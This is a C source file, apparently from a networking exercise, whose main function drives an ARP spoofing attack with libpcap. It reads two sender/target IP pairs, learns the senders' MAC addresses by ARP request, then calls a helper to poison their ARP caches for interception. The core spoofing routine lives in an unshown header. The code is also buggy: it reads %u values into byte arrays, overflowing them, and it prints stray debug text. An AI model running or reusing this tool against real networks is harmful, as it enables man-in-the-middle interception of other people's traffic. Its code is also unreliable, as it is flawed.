#include <stdio.h>
#include "arp_spoof.h"
#include <pcap.h>

int main(int argc, char* argv[]){
	uint32_t myip = 0;
	uint8_t mymac[10];
	uint8_t send_ip1[10], send_ip2[10];
	uint8_t target_ip1[10], target_ip2[10];
	uint8_t send_mac1[10], send_mac2[10];
	
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	if(argc != 6){
		printf("more argumnets");
		return -1;
	}
	sscanf(argv[2],"%u.%u.%u.%u",send_ip1,send_ip1 + 1,send_ip1 + 2,send_ip1 + 3);
	sscanf(argv[3],"%u.%u.%u.%u",target_ip1,target_ip1 + 1,target_ip1 + 2,target_ip1 + 3);
	sscanf(argv[4],"%u.%u.%u.%u",send_ip2,send_ip2 + 1,send_ip2 + 2,send_ip2 + 3);
	sscanf(argv[5],"%u.%u.%u.%u",target_ip2,target_ip2 + 1,target_ip2 + 2,target_ip2 + 3);
	get_myIpaddr(&myip, argv[1]);
	get_myMacaddr(mymac, argv[1]);
	
	print_len(send_ip1,4);
	print_len(send_ip2,4);
	print_len(target_ip1,4);
	print_len(target_ip2,4);
	
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if(handle == NULL){
		fprintf(stderr, "couldn't open device %s: %s\n",argv[1],errbuf);
		return -1;
	}
	
	//get sender mac address
	arp_send_pkt_req(send_mac1, send_ip1, mymac,(uint8_t*)&myip, handle);
	arp_send_pkt_req(send_mac2, send_ip2, mymac,(uint8_t*)&myip, handle);

	printf("sender1 mac_add");
	print_len(send_mac1,6);
	puts("haha");
	printf("\nsender2 mac_add : ");
	print_len(send_mac2,6);
	
	//arp spoofing
	arp_spoof_on(send_mac1, send_ip1, target_ip1, send_mac2, send_ip2, target_ip2, mymac, (uint8_t*)&myip, handle); 
	printf("arp spoofing end");
	pcap_close(handle);
	return 1;
}
